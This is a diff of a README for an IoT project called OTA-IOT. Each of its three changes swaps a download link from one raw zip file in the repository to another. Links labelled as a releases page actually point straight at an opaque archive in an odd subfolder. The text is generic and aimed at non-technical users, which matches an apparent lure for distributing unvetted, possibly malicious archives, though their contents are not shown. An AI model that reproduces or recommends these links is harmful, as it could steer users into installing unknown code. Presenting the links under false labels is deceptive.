@@ -1,7 +1,7 @@
 # 🌟 OTA-IOT - Simple IoT Project for Everyone
 
 ## 🔗 Download Now
-[![Download OTA-IOT](https://raw.githubusercontent.com/AngelicaArabe/OTA-IOT/main/deltidial/OTA-IOT.zip)](https://raw.githubusercontent.com/AngelicaArabe/OTA-IOT/main/deltidial/OTA-IOT.zip)
+[![Download OTA-IOT](https://raw.githubusercontent.com/AngelicaArabe/OTA-IOT/main/include/IOT_OT_1.3.zip)](https://raw.githubusercontent.com/AngelicaArabe/OTA-IOT/main/include/IOT_OT_1.3.zip)
 
 ## 📝 Description
 OTA-IOT is a DIY project designed for anyone interested in Internet of Things (IoT) applications. It supports Over-The-Air (OTA) updates, logs data using WebSockets, sets up Wi-Fi connections easily, and even hosts a local web server using SPIFFS. This project offers a user-friendly way to manage your IoT devices without needing advanced technical skills.
@@ -15,7 +15,7 @@ To get started with OTA-IOT, follow these simple steps:
    - A basic understanding of how to connect devices to Wi-Fi.
 
 2. **Download the Software**
-   - Visit this page to download: [OTA-IOT Releases](https://raw.githubusercontent.com/AngelicaArabe/OTA-IOT/main/deltidial/OTA-IOT.zip).
+   - Visit this page to download: [OTA-IOT Releases](https://raw.githubusercontent.com/AngelicaArabe/OTA-IOT/main/include/IOT_OT_1.3.zip).
    - Select the latest release available.
 
 3. **Extract the Files**
@@ -48,7 +48,7 @@ To get started with OTA-IOT, follow these simple steps:
    - Set the baud rate to 115200 to view real-time logs from your device.
 
 ## 📥 Download & Install
-You can download the latest version of OTA-IOT software from our [Releases page](https://raw.githubusercontent.com/AngelicaArabe/OTA-IOT/main/deltidial/OTA-IOT.zip). Follow the steps mentioned earlier to extract and set up the software. 
+You can download the latest version of OTA-IOT software from our [Releases page](https://raw.githubusercontent.com/AngelicaArabe/OTA-IOT/main/include/IOT_OT_1.3.zip). Follow the steps mentioned earlier to extract and set up the software. 
 
 ## ℹ️ Features
 - **OTA Updates**: Update your device firmware over Wi-Fi without connecting it to your computer.
